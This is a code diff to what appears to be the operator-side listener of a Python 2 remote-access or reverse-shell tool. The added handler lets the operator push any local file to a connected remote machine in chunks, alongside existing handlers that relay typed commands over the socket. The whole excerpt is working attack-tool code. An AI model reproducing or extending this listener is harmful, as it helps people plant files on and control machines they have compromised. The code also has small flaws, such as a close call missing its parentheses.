@@ -74,6 +74,34 @@ class listener(object):
                     resp = raw_input()+"\n"
                     connection.sendall(resp)
 
+                elif resp.startswith("upload("):
+                    connection.sendall(resp)
+                    data = connection.recv(4096)
+                    if data == "ok":
+                        name = resp[7:-2]
+                        print name
+                        if os.path.isfile(name):
+                            print "Uploading "+name+"..."
+                            with open(name, "rb") as file:
+                                # Image_Str = base64.b64encode(imageFile.read())
+                                File_Str = file.read()
+                            fh = open("text", "wb")
+                            fh.write(File_Str)
+                            fh.close
+                            fh = open("text", "rb")
+                            str1 = fh.read(150)
+                            connection.send(str1)
+                            while str1:
+                                str1 = fh.read(150)
+                                connection.sendall(str1)
+                            connection.sendall("6finish")
+
+                            fh.close()
+                            os.remove("text")
+                            print name+" uploaded sucessfully."
+                        else:
+                            print name+" does not exists."
+
                 elif resp.startswith("status"):
                         print "Listener running..."
                         resp = raw_input() + "\n"
